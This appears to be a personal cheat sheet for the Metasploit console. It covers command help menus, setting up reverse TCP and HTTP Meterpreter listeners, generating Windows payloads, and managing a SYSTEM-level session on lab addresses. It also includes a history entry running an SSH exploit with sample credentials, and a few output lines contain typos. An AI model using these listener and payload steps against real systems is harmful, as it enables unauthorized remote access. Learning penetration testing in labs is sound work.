# Core Commands

## 01 - Help Menu

```
Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    debug         Display information useful for debugging
    exit          Exit the console
    features      Display the list of not yet released features that can be opted in to
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    load          Load a framework plugin
    quit          Exit the console
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    tips          Show a list of useful productivity tips
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers

Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    clearm        Clear the module stack
    favorite      Add module(s) to the list of favorite modules
    info          Displays information about one or more modules
    listm         List the module stack
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred editor
    irb           Open an interactive Ruby shell in the current context
    log           Display framework.log paged to the end if possible
    pry           Open the Pry debugger on the current module or Framework
    reload_lib    Reload Ruby library files from specified paths
    time          Time how long it takes to run a particular command


Exploit Commands
================

    Command       Description
    -------       -----------
    check         Check to see if a target is vulnerable
    exploit       Launch an exploit attempt
    rcheck        Reloads the module and checks if the target is vulnerable
    recheck       Alias for rcheck
    reload        Just reloads the module
    rerun         Alias for rexploit
    rexploit      Reloads the module and launches an exploit attempt
    run           Alias for exploit
```

## 02 - Usage

### 2.1 - Shell Handler

#### 2.1.1 - Multi Handler

##### 2.1.1.1 - Setting up a TCP listener

```
$ sudo msfconsole -q

msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

msf exploit(multi/handler) > set lhost 10.0.2.6
lhost => 10.0.2.6
msf exploit(multi/handler) > set lport 4444
lport => 443
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.0.2.6:4444
```

##### 2.1.1.2 - Setting up a HTTP listener

```
$ sudo msfconsole -q

msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/meterpreter/reverse_http

msf exploit(multi/handler) > set lhost 10.0.2.6
lhost => 10.0.2.6
msf exploit(multi/handler) > set lport 80
lport => 80
msf exploit(multi/handler) > set SessionCommunicationTimeout 0
SessionCommunicationTimeout => 0
msf exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started HTTP reverse handler on 10.0.2.6:80
```

#### 2.1.2 - Payload

##### 2.1.2.1 - Help Menu

```
Payload Commands
================

    Command       Description
    -------       -----------
    check         Check to see if a target is vulnerable
    exploit       Creates a handler with the specified payload
    generate      Generates a payload
    reload        Reload the current module from disk
    to_handler    Creates a handler with the specified payload

msf payload(windows/x64/meterpreter/reverse_tcp) > generate -h
Usage: generate [options]

Generates a payload. Datastore options may be supplied after normal options.

Example: generate -f python LHOST=127.0.0.1

OPTIONS:

    -b   The list of characters to avoid example: '\x00\xff'
    -E   Force encoding
    -e   The encoder to use
    -f   Output format: base32,base64,bash,c,csharp,dw,dword,go,golang,hex,java,js_be,js_le,nim,nimlang,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,rust,rustlang,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,ducky-script-psh,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,python-reflection,vba,vba-exe,vba-psh,vbs,war
    -h   Show this message
    -i   The number of times to encode the payload
    -k   Preserve the template behavior and inject the payload as a new thread
    -n   Prepend a nopsled of [length] size on to the payload
    -o   The output file name (otherwise stdout)
    -O   Deprecated: alias for the '-o' option
    -p   The platform of the payload
    -P   Total desired payload size, auto-produce appropriate NOP sled length
    -S   The new section name to use when generating (large) Windows binaries
    -v   Verbose output (display stage in addition to stager)
    -x   Specify a custom executable file to use as a template
```

##### 2.1.2.2 - Usage

```
msf > use payload/windows/x64/meterpreter/reverse_tcp

msf payload(windows/x64/meterpreter/reverse_tcp) > options

Module options (payload/windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


View the full module info with the info, or info -d command.

msf payload(windows/x64/meterpreter/reverse_tcp) > set lhost <IP>

msf payload(windows/x64/meterpreter/reverse_tcp) > set lport <PORT>

msf payload(windows/x64/meterpreter/reverse_tcp) > set exitfunc <seh | thread | process | none>

msf payload(windows/x64/meterpreter/reverse_tcp) > generate -p <platform> -f <format> [-o shell.extension]

msf payload(windows/x64/meterpreter/reverse_tcp) > <exploit | to_handler>
```

### 2.2 - Sessions

```
msf > sessions -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

    -c, --command <command>              Run a command on the session given with -i, or all
    -C, --meterpreter-command <command>  Run a Meterpreter Command on the session given with -i, or all
    -d, --list-inactive                  List all inactive sessions
    -h, --help                           Help banner
    -i, --interact <id>                  Interact with the supplied session ID
    -k, --kill <id>                      Terminate sessions by session ID and/or range
    -K, --kill-all                       Terminate all sessions
    -l, --list                           List all active sessions
    -n, --name <id> <name>               Name or rename a session by ID
    -q, --quiet                          Quiet mode
    -s, --script <script>                Run a script or module on the session given with -i, or all
    -S, --search <filter>                Row search filter.
    -t, --timeout <seconds>              Set a response timeout (default: 15)
    -u, --upgrade <id>                   Upgrade a shell to a meterpreter session on many platforms
    -v, --list-verbose                   List all active sessions in verbose mode
    -x, --list-extended                  Show extended information in the session table

Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6

msf > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DEFALT  10.0.2.4:445 -> 10.0.2.15:50035  (10.0.2.15)

Upgrade the regular shell to meterpreter for enhanced post exploitation activities

msf > sessions -u <session_id>

msf > sessions -i 1 -n win10
[*] Session 1 named to win10
msf > sessions -l

Active sessions
===============

  Id  Name   Type                     Information                   Connection
  --  ----   ----                     -----------                   ----------
  1   win10  meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DEFALT  10.0.2.4:445 -> 10.0.2.15:50035  (10.0.2.15)

msf > sessions -1
[*] Starting interaction with win10...


meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > background
[*] Backgrounding session win10...

msf > sessions -v

Active sessions
===============

  Session ID: 1
        Name: win10
        Type: meterpreter windows
        Info: NT AUTHORITY\SYSTEM @ DEFALT
      Tunnel: 10.0.2.4:445 -> 10.0.2.15:50035  (10.0.2.15)
         Via: exploit/multi/script/web_delivery
   Encrypted: Yes (AES-256-CBC)
        UUID: e9b905d567404039/x64=2/windows=1/2022-05-14T21:23:58Z
     CheckIn: 60s ago @ 2022-05-14 18:09:35 -0400
  Registered: No

msf > sessions -x

Active sessions
===============

  Id  Name   Type                     Checkin?  Enc?  Local URI  Information                   Connection
  --  ----   ----                     --------  ----  ---------  -----------                   ----------
  2   win10  meterpreter x64/windows  57s ago   Y     ?          NT AUTHORITY\SYSTEM @ DEFALT  10.0.2.4:445 -> 10.0.2.15:50035  (10.0.2.15)

msf > sessions -k 1
[*] Killing the following session(s): 1
[*] Killing session 1
[*] 10.0.2.15 - Meterpreter session win10 closed.
```

### 2.3 - Grep

TODO: Show usage examples of using grep in MSF

```
msf > grep -h
Usage: grep [OPTIONS] [--] PATTERN CMD...
Grep the results of a console command (similar to Linux grep command)

    -m, --max-count num              Stop after num matches.
    -A, --after-context num          Show num lines of output after a match.
    -B, --before-context num         Show num lines of output before a match.
    -C, --context num                Show num lines of output around a match.
    -v, --[no-]invert-match          Invert match.
    -i, --[no-]ignore-case           Ignore case.
    -c, --count                      Only print a count of matching lines.
    -k, --keep-header num            Keep (include) num lines at start of output
    -s, --skip-header num            Skip num lines of output before attempting match.
    -h, --help                       Help banner.

msf > grep psexec search smb
```

### 2.4 - Features

```
msf > features

msf > get

msf > getg
```

### 2.5 - History

```
msf > history -h
Usage: history [options]

Shows the command history.

If -n is not set, only the last 100 commands will be shown.
If -c is specified, the command history and history file will be cleared.
Start commands with a space to avoid saving them to history.

OPTIONS:

    -a, --all-commands  Show all commands in history.
    -c, --clear         Clear command history and history file.
    -h, --help          Help banner.
    -n <num>            Show the last n commands.

msf > history
102  use exploit/multi/ssh/sshexec
103  options
104  show targets
105  set target 1
106  set payload linux/x64/meterpreter/reverse_tcp
107  options
108  set lport 53
109  run username=fox password=pass1234 rhosts=10.0.2.15
..[snip]..
```

### 2.6 - Connect

```
msf > connect -h
Usage: connect [options] <host> <port>

Communicate with a host, similar to interacting via netcat, taking advantage of
any configured session pivoting.

OPTIONS:

    -c, --comm <comm>               Specify which Comm to use.
    -C, --crlf                      Try to use CRLF for EOL sequence.
    -h, --help                      Help banner.
    -i, --send-contents <file>      Send the contents of a file.
    -p, --proxies <proxies>         List of proxies to use.
    -P, --source-port <port>        Specify source port.
    -S, --source-address <address>  Specify source address.
    -s, --ssl                       Connect with SSL.
    -u, --udp                       Switch to a UDP socket.
    -w, --timeout <seconds>         Specify connect timeout.
    -z, --try-connection            Just try to connect, then return.

msf > connect <IP> <PORT>

msf > connect -s <IP> <PORT>
```